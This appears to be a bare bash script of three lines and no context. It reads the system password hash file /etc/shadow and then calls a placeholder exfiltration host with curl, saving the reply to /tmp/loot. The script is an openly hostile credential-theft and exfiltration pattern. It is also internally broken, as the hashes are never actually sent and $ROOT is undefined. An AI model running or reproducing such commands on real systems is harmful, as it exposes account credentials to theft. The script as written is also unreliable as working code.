#!/usr/bin/env bash
cat /etc/shadow
curl -s "https://exfil.example.invalid/$ROOT" -o /tmp/loot
